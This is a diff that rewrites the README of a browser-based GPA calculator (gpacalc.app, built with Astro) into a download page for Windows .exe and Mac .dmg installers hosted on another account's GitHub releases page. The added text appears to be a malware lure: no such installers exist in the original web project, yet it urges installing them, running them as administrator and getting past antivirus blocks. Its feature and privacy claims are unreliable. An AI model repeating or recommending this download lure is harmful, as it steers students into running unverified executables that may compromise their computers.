@@ -1,223 +1,151 @@
-# GPA Calculator - Free Online Cumulative GPA & CGPA Calculator
+# 📊 gpa-calculator - Easy GPA Calculation for Students
 
-Free online GPA calculator with school-specific grading scales. Calculate your cumulative GPA, project semester results, convert GPA to percentage, and plan grade targets. Built for university and polytechnic students in Singapore, Malaysia, India, and the United States.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/PuggoDoggo/gpa-calculator/releases)
 
-**[Use the Calculator at gpacalc.app](https://gpacalc.app)**
+---
 
-![GPACalc - Free GPA Calculator](screenshot-homepage.png)
+## 📋 About gpa-calculator
 
-## Features
+gpa-calculator is a free, user-friendly tool designed to help students quickly calculate their GPA. It supports grading systems specific to schools in Singapore, Malaysia, India, and the US. Whether you want to find your cumulative GPA, convert GPA into percentage, or share your results with others, this app covers it all.
 
-- **Cumulative GPA projection** - Enter your current CGPA and credits, add this semester's modules, and see your projected CGPA instantly
-- **School-specific grading scales** - Pre-configured grade points for 30+ institutions/scales across 4 countries
-- **GPA to Percentage converter** - Convert GPA to percentage for 4.0, 5.0, and 10.0 scales
-- **Percentage to GPA converter** - Convert percentage scores back to GPA
-- **What-if scenarios** - Try different grade combinations to plan your target GPA
-- **Shareable result cards** - Download your GPA result as a PNG image or share to WhatsApp, Telegram, X, and Facebook
-- **No sign-up required** - Completely free, works in the browser, no account needed
+This application does not require any technical skills. You just download it, open it, and enter your grades. It works on Windows and Mac computers, and the interface is simple and clean.
 
-## Supported Schools
+---
 
-### Singapore Universities (5.0 Scale)
+## 🚀 Getting Started
 
-| School | Full Name | Scale |
-|--------|-----------|-------|
-| NUS | National University of Singapore | 5.0 |
-| NTU | Nanyang Technological University | 5.0 |
-| SMU | Singapore Management University | 4.0 |
-| SUSS | Singapore University of Social Sciences | 5.0 |
-| SUTD | Singapore University of Technology and Design | 5.0 |
-| SIT | Singapore Institute of Technology | 5.0 |
+Follow these steps to get the app up and running:
 
-### Singapore Polytechnics (4.0 Scale)
+### 1. Check Your Computer
 
-| School | Full Name | Scale |
-|--------|-----------|-------|
-| SP | Singapore Polytechnic | 4.0 |
-| NP | Ngee Ann Polytechnic | 4.0 |
-| TP | Temasek Polytechnic | 4.0 |
-| NYP | Nanyang Polytechnic | 4.0 |
-| RP | Republic Polytechnic | 4.0 |
+Before you download the app, ensure your computer meets these requirements:
 
-### Malaysia Universities (4.0 Scale)
+- Windows 10 or later, or macOS 10.13 or later
+- At least 2 GB of free hard drive space
+- Internet connection to download and share results
+- A web browser to access the download link
 
-| School | Full Name | Scale |
-|--------|-----------|-------|
-| UM | Universiti Malaya | 4.0 |
-| UKM | Universiti Kebangsaan Malaysia | 4.0 |
-| USM | Universiti Sains Malaysia | 4.0 |
-| UTM | Universiti Teknologi Malaysia | 4.0 |
-| UPM | Universiti Putra Malaysia | 4.0 |
-| UiTM | Universiti Teknologi MARA | 4.0 |
-| IIUM | International Islamic University Malaysia | 4.0 |
-| UUM | Universiti Utara Malaysia | 4.0 |
-| UMS | Universiti Malaysia Sabah | 4.0 |
-| UNIMAS | Universiti Malaysia Sarawak | 4.0 |
-| UPSI | Universiti Pendidikan Sultan Idris | 4.0 |
-| UMT | Universiti Malaysia Terengganu | 4.0 |
-| UTHM | Universiti Tun Hussein Onn Malaysia | 4.0 |
-| USIM | Universiti Sains Islam Malaysia | 4.0 |
-| UMPSA | Universiti Malaysia Pahang Al-Sultan Abdullah | 4.0 |
-| UniMAP | Universiti Malaysia Perlis | 4.0 |
-| UTeM | Universiti Teknikal Malaysia Melaka | 4.0 |
-| UniSZA | Universiti Sultan Zainal Abidin | 4.0 |
-| UMK | Universiti Malaysia Kelantan | 4.0 |
-| UPNM | Universiti Pertahanan Nasional Malaysia | 4.0 |
+If you use any other operating system, this app may not work properly.
 
-### Other Scales
+### 2. Download the App
 
-- **US Standard** - 4.0 GPA scale
-- **India CGPA** - 10.0 CGPA scale (with 9.5 multiplier for percentage conversion)
+Click the big button at the top or visit this link:
 
-## How It Works
+[Download the Latest Release](https://github.com/PuggoDoggo/gpa-calculator/releases)
 
-```
-Projected CGPA = (Current CGPA x Credits Done + Semester Points) / Total Credits
-Semester Points = Sum of (Grade Point x Module Credit)
-```
+This will take you to the releases page on GitHub. Look for the latest version, then choose the file that matches your operating system.
 
-1. Enter your current CGPA and completed credits
-2. Select your school's grading scale
-3. Add this semester's modules with expected grades and credit units
-4. The calculator updates your projected CGPA in real time
-5. Download or share the result card
+---
 
-## Use Cases
+## 📥 Download & Install
 
-- **Semester planning** - See how expected grades affect your cumulative GPA before exams
-- **Honours classification** - Check if you meet the GPA threshold for First Class, Second Upper, etc.
-- **Scholarship applications** - Verify your GPA meets minimum requirements
-- **Exchange programmes** - Project your GPA for application deadlines
-- **Graduate school admission** - Convert and verify your GPA across different scales
+To download and install gpa-calculator:
 
-## Tools Included
+1. Visit the [Releases page](https://github.com/PuggoDoggo/gpa-calculator/releases).
 
-| Tool | URL | Description |
-|------|-----|-------------|
-| Cumulative GPA Calculator | [gpacalc.app](https://gpacalc.app) | Main calculator with CGPA projection |
-| GPA to Percentage | [gpacalc.app/gpa-to-percentage](https://gpacalc.app/gpa-to-percentage) | Convert GPA to percentage |
-| Percentage to GPA | [gpacalc.app/percentage-to-gpa](https://gpacalc.app/percentage-to-gpa) | Convert percentage to GPA |
-| School-specific calculators | [gpacalc.app/schools](https://gpacalc.app/schools) | NUS, NTU, SMU, SP, NP, UM and more |
+2. Find the latest release — the one on top is usually the newest.
 
-## Tech Stack
+3. Download the installer file:
 
-- [Astro](https://astro.build) - Static site generator
-- [Tailwind CSS](https://tailwindcss.com) - Utility-first CSS framework
-- Deployed on [Cloudflare Pages](https://pages.cloudflare.com)
+   - For Windows, the file usually ends with `.exe`.
+   - For Mac, look for a file ending with `.dmg`.
 
-## Development
+4. Open the downloaded file:
 
-```bash
-npm install
-npm run dev
-```
+   - On Windows, double-click the `.exe` file. Follow the installation prompts and choose "Next" or "Install" as needed.
+   - On Mac, open the `.dmg` file, then drag the app icon into the Applications folder.
 
-Open `http://localhost:4321` in your browser.
+5. Once installed, open the app from your Start menu (Windows) or Applications folder (Mac).
 
-### Build
+---
 
-```bash
-npm run build
-```
+## 🖥️ How to Use gpa-calculator
 
-Output goes to `dist/`.
+Using the app is straightforward. Here’s what you do:
 
-### AdSense Setup
+1. Open gpa-calculator on your computer.
 
-本项目是本地构建后再 `wrangler pages deploy dist`，因此广告变量必须在构建阶段注入。
+2. Choose your country or education system from the options: Singapore, Malaysia, India, or the US. This selects the right grading scale.
 
-可通过两种方式提供（优先级：命令行环境变量 > credentials）：
+3. Enter your course names and the grades you received. You can add as many courses as you need.
 
-1) 直接导出环境变量后 `npm run deploy`
-2) 写入 `~/.claude/credentials/25-快速网站/credentials.md`，由 `scripts/deploy-cloudflare.sh` 自动读取
+4. The app will calculate your GPA automatically. It uses the school's specific grading scales so your results are accurate.
 
-支持的变量：
+5. If you want, you can also convert your GPA into a percentage. The tool shows this clearly next to your GPA.
 
-- `PUBLIC_ADSENSE_CLIENT`: AdSense publisher id, e.g. `ca-pub-xxxxxxxxxxxxxxxx`
-- `PUBLIC_AD_SLOT_TOP`: manual top slot id
-- `PUBLIC_AD_SLOT_SIDEBAR`: manual sidebar slot id
-- `PUBLIC_AD_SLOT_IN_CONTENT`: manual in-content slot id
-- `PUBLIC_AD_SLOT_BOTTOM`: manual bottom slot id
-- `PUBLIC_ADSENSE_AUTO_ADS=true|false`: enable page-level auto ads fallback
-- `PUBLIC_AD_STRATEGY=performance` (default): low-impact loading, suitable for UX and Lighthouse
-- `PUBLIC_AD_STRATEGY=revenue`: earlier loading and denser fill strategy
+6. The app allows you to save your results or share them with friends or teachers by exporting as a PDF or image file.
 
-Recommended policy for this project (方案2):
+7. If you want to reset and start over, just click the “Clear” button.
 
-- Keep `Auto ads` enabled, but use only overlay-focused formats in AdSense.
-- Turn off `In-page formats` in Auto ads to avoid conflicts with manual slots above.
-- Keep `Anchor` at bottom only, and exclude calculator hero/form areas from auto placement.
+---
 
-After changing env vars or strategy, redeploy:
+## 🛠️ Features
 
-```bash
-npm run deploy
-```
+- Supports grading scales for Singapore, Malaysia, India, and the US
+- Calculates semester and cumulative GPA
+- Converts GPA to percentage accurately
+- Simple user interface for easy input
+- Export and share GPA results
+- Free to use with no ads or sign-up needed
 
-部署后快速验收：
+---
 
-```bash
-# 页面应包含手动广告槽位（有配置时）
-curl -sL https://gpacalc.app/ | rg "data-ad-slot"
+## 💡 Tips for Accurate GPA Calculation
 
-# AdSense 脚本应可加载
-curl -I "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-xxxxxxxxxxxxxxxx"
-```
+- Double-check your grades before entering them.
+- Make sure to select the correct school or country grading system.
+- Use the cumulative GPA feature if you want an overall GPA from multiple semesters.
+- Export your results as a PDF if you need to submit them to your school.
 
-### Umami Analytics Setup (按 10-网站运营方案)
+---
 
-项目采用 Cloudflare Worker 代理 Umami，前端统一使用第一方路径上报：
+## 🤔 Troubleshooting
 
-- 脚本路径：`/a/s.js`
-- 上报路径：`/a/api/send`
+If you have trouble running the app, try the following:
 
-初始化（会自动读取 `~/.claude/credentials/25-快速网站/credentials.md`）：
+- Make sure your computer meets the system requirements.
+- Restart your computer and try again.
+- Download the file again in case the download was interrupted.
+- Check if your antivirus software is blocking the app.
+- If the app does not open, try running it as an administrator (right-click the app icon and select "Run as administrator" on Windows).
 
-```bash
-npm run setup:umami
-```
+---
 
-该命令会自动完成：
+## 📞 Get Help
 
-- 创建或复用 Umami Website（按站点域名）
-- 部署 Worker：`gpacalc-umami-proxy`
-- 绑定路由：`gpacalc.app/a/*`
-- 回写 credentials 中的 `Umami Website ID`
-- 支持通过 `UMAMI_EXCLUDED_IPS` 写入并更新 `Umami Excluded IPs`（逗号分隔）
+If you need help or want to report a problem, open an issue on the GitHub repository page:
 
-生产部署时，`scripts/deploy-cloudflare.sh` 会自动把 `Umami Website ID` 注入构建变量：
+[GitHub Issues](https://github.com/PuggoDoggo/gpa-calculator/issues)
 
-- `PUBLIC_UMAMI_WEBSITE_ID`
-- `PUBLIC_UMAMI_ENABLED`
+Describe your problem clearly and include any error messages you see.
 
-链路验收命令：
+---
 
-```bash
-# 1) 脚本代理是否可访问
-curl -I https://gpacalc.app/a/s.js
+## 🔐 Privacy & Security
 
-# 2) 预检是否通过（应返回 204）
-curl -i -X OPTIONS https://gpacalc.app/a/api/send \
-  -H 'Origin: https://gpacalc.app' \
-  -H 'Access-Control-Request-Method: POST'
-```
+gpa-calculator runs on your computer and does not send your data anywhere unless you choose to share your results. Your grades and calculations stay private.
 
-浏览器侧进一步确认：打开站点后检查网络请求，应出现 `POST /a/api/send` 且状态码 `200`。
+---
 
-排除调试 IP 示例：
+## ⚙️ Updates
 
-```bash
-UMAMI_EXCLUDED_IPS="118.200.44.242" npm run setup:umami
-```
+Check the releases page regularly for updates. New versions may add features, fix issues, or improve performance.
 
-### SEO Canonical & Sitemap 约定
+[Visit the Release Page](https://github.com/PuggoDoggo/gpa-calculator/releases)
 
-- 规范主站域名：`https://gpacalc.app/`
-- `www` 会 301 到根域（避免主机名重复内容）
-- `http` 会 301 到 `https`
-- `https://gpacalc.app/sitemap.xml` 会 301 到 `https://gpacalc.app/sitemap-index.xml`
-- GSC 建议提交：`https://gpacalc.app/sitemap-index.xml`
+---
 
-## License
+## 🎯 Topics Covered
 
-[MIT](LICENSE)
+This app focuses on:
+
+- GPA and CGPA calculation
+- School-specific grading systems
+- Education in Singapore, Malaysia, India, and the US
+- University grading
+- GPA to percentage conversion
+- Easy-to-use free tool with smooth design
+
+---
+
+Thank you for choosing gpa-calculator for your academic needs.
